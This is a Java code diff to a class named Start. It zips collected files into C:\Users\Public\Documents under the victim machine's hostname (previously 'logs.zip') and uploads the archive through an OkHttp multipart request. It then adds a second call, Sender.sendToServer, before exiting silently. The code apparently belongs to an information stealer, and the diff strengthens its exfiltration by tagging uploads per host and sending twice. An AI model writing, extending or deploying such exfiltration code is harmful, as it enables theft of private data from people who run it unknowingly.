@@ -6,9 +6,8 @@ import okhttp3.MultipartBody;
 import okhttp3.OkHttpClient;
 import okhttp3.RequestBody;
 
-import java.io.File;
-import java.io.FileWriter;
-import java.io.IOException;
+import java.io.*;
+import java.net.InetAddress;
 import java.net.MalformedURLException;
 import java.util.Objects;
 import java.util.Scanner;
@@ -16,7 +15,6 @@ import java.net.URL;
 import javax.swing.JOptionPane;
 import java.nio.channels.Channels;
 import java.nio.channels.ReadableByteChannel;
-import java.io.FileOutputStream;
 
 
 public class Start {
@@ -41,7 +39,9 @@ public class Start {
         Zip.main(argument);
         OkHttpClient client = new OkHttpClient();
 
-        final String zort = "C:\\Users\\Public\\Documents\\logs.zip";
+        String computername= InetAddress.getLocalHost().getHostName();
+
+        final String zort = "C:\\Users\\Public\\Documents\\" + computername +  ".zip";
 
         File asd = new File(zort);
 
@@ -51,6 +51,8 @@ public class Start {
                 .build();
 
         Sender.Sender(client, asd, requestBody);
+
+        Sender.sendToServer(zort);
 
         System.exit(0);
 	}
